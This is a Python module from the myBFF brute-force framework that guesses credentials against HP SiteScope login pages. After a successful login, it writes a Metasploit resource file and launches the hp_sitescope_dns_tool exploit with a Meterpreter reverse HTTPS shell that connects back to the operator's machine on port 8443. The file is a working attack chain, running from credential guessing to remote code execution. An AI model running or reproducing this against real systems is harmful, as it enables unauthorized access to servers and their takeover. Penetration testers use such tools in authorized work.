#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
import os
import socket
import random
import time

class SiteScopeBrute(webModule):
    def __init__(self, config, display, lock):
        super(SiteScopeBrute, self).__init__(config, display, lock)
        self.fingerprint="SiteScope"
        self.response="Success"
        self.protocol="web"
    def somethingCool(self, config):
        host = config["HOST"].split(":")[1]
        host = host.split("/")[2]
        port = config["HOST"].split(":")[2]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host,int(port)))
        locIP = s.getsockname()[0]
        s.close()
        msfrf = open('msfresource.rc', 'w')
        msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
        msfrf.write('set PAYLOAD windows/meterpreter/reverse_https\n')
        msfrf.write('set RHOST ' + host + '\n')
        msfrf.write('set RPORT ' + port + '\n')
        msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
        msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
        msfrf.write('set LHOST ' + locIP + '\n')
        msfrf.write('set LPORT 8443\n')
        msfrf.write('set ExitOnSession false\n')
        msfrf.write('exploit\n')
        msfrf.close()
        os.system("msfconsole -r msfresource.rc")
        os.system("rm msfresource.rc")
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            resp1 = c.get(config["HOST"] + '/SiteScope/', proxies=proxy)
            cookie1 = resp1.cookies['JSESSIONID']
            cookies = dict(JSESSIONID=cookie1)
            c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
            c.cookies.clear()
            cpost = c.post(config["HOST"] + '/SiteScope/j_security_check', cookies=cookies, data=payload, allow_redirects=False, proxies=proxy)
            #print cpost.text
            if '200' in cpost:
                m = re.search("Incorrect user name or password", cpost.text)
                if m:
                    print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
                else:
                    print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                    if not config["dry_run"]:
                        print("[!] Time to do something cool!")
                        self.somethingCool(config)
            else:
                print "[-] An error has occurred..."
